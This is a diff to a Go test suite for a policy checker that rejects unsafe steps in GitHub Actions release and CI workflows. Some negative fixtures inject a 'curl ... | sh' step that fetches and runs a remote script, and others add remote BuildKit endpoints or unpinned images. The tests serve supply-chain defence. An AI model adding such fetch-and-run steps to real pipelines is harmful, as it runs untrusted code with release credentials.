@@ -106,6 +106,25 @@ const (
 	sha40           = "1111111111111111111111111111111111111111"
 )
 
+// releaseViewCheck is the release job's check that no release of the tag
+// exists, a draft included (#72 review B, N1).
+const releaseViewCheck = `          if out=$(gh release view "v$VERSION" --repo "$GITHUB_REPOSITORY" --json isDraft --jq .isDraft 2>&1); then
+            echo "::error::a release v$VERSION exists (draft: $out); delete it if it is a leftover, then run again"
+            exit 1
+          elif [ "$out" != "release not found" ]; then
+            echo "::error::could not check for the release v$VERSION: $out"
+            exit 1
+          fi
+`
+
+// buildxWorkflow is a workflow other than release.yml with one pinned
+// setup-buildx step and the given extra inputs.
+func buildxWorkflow(extra string) string {
+	return "permissions:\n  contents: read\njobs:\n  x:\n    runs-on: ubuntu-24.04\n    steps:\n" +
+		"      - uses: docker/setup-buildx-action@f87e5991a6d7451dcb8d9637bfbc97413f497069 # v4.4.1\n        with:\n" +
+		"          driver-opts: image=" + buildkitImage + "\n" + extra
+}
+
 // runStep is a run step inserted before the -verify-pushed step.
 func runStepBefore(job, run string) mutation {
 	return inJob(job, pushedStep, "      - run: "+run+"\n"+pushedStep)
@@ -252,7 +271,7 @@ var releaseCases = []struct {
 	{"fail-27-concurrency-job", inJob("latest", "    permissions:\n", "    concurrency: latest\n    permissions:\n"), nil, []string{"job latest: concurrency is not allowed: only the workflow-level concurrency group release serialises the runs (B6)"}},
 	// #27 part 4b, #71 review B N2: attest, attest-assets and release have
 	// exact steps.
-	{"fail-27-4b-release-curl-sh", inJob("release", "SOURCES.md SHA256SUMS\n", "SOURCES.md SHA256SUMS\n          curl -sSf https://example.org/install | sh\n"),
+	{"fail-27-4b-release-curl-sh", inJob("release", `"${start[@]}" ./*`+"\n", `"${start[@]}" ./*`+"\n          curl -sSf https://example.org/install | sh\n"),
 		nil, []string{"job release: step 4 runs a text that is not one of this job's lines"}},
 	{"fail-27-4b-attest-third-party", inJob("attest", "      - name: Checksum\n", "      - uses: other/sign@"+sha40+"\n      - name: Checksum\n"),
 		nil, []string{"job attest: step 3 uses other/sign@" + sha40 + ", which is not one of this job's actions", "job attest has 20 steps; the release policy has exactly 19"}},
@@ -305,6 +324,19 @@ var releaseCases = []struct {
 		nil, []string{"job build: step 4 uses docker/setup-buildx-action with", "job build: step 4: docker/setup-buildx-action starts BuildKit from the floating moby/buildkit:buildx-stable-1"}},
 	{"fail-27-4b-buildx-unpinned", inJob("push", "          driver-opts: image="+buildkitImage+"\n", "          driver-opts: image=moby/buildkit:latest\n"),
 		nil, []string{"job push: step 3 must be exactly uses docker/setup-buildx-action@", `job push: step 3: BuildKit image (driver-opts) "moby/buildkit:latest" is not pinned`}},
+	// #72 round 2. Review A, B1: release uploads every file SHA256SUMS
+	// lists (all of dist), not a list that leaves notes.md out.
+	{"fail-27-4b-release-asset-list", inJob("release", `"${start[@]}" ./*`+"\n", `"${start[@]}" \`+"\n            \"keepia-mail-$VERSION.tar.gz\" sbom-*.spdx.json sources.json SOURCES.md SHA256SUMS\n"),
+		nil, []string{"job release: step 4 runs a text that is not one of this job's lines"}},
+	// Review B, N1: the tag step refuses any existing release, a draft
+	// included, so the cleanup only ever finds this run's draft.
+	{"fail-27-4b-tag-no-release-check", inJob("release", releaseViewCheck, ""),
+		nil, []string{"job release: step 3 runs a text that is not one of this job's lines"}},
+	// Review B, N2: setup-buildx takes no other input, in any workflow.
+	{"fail-27-4b-ci-buildx-append", unchanged, map[string]string{".github/workflows/other.yml": buildxWorkflow("          append: |\n            - endpoint: tcp://192.0.2.1:1234\n              driver-opts: image=moby/buildkit:latest\n")},
+		[]string{"other.yml:4: job x: step 1: docker/setup-buildx-action input append is not allowed"}},
+	{"fail-27-4b-ci-buildx-version-endpoint", unchanged, map[string]string{".github/workflows/other.yml": buildxWorkflow("          version: latest\n          endpoint: tcp://192.0.2.1:1234\n")},
+		[]string{"other.yml:4: job x: step 1: docker/setup-buildx-action input endpoint is not allowed", "other.yml:4: job x: step 1: docker/setup-buildx-action input version is not allowed"}},
 	{"fail-27-4b-ci-buildx-floating", unchanged, map[string]string{".github/workflows/other.yml": "permissions:\n  contents: read\njobs:\n  x:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: docker/setup-buildx-action@f87e5991a6d7451dcb8d9637bfbc97413f497069 # v4.4.1\n"},
 		[]string{"other.yml:4: job x: step 1: docker/setup-buildx-action starts BuildKit from the floating moby/buildkit:buildx-stable-1"}},
 }
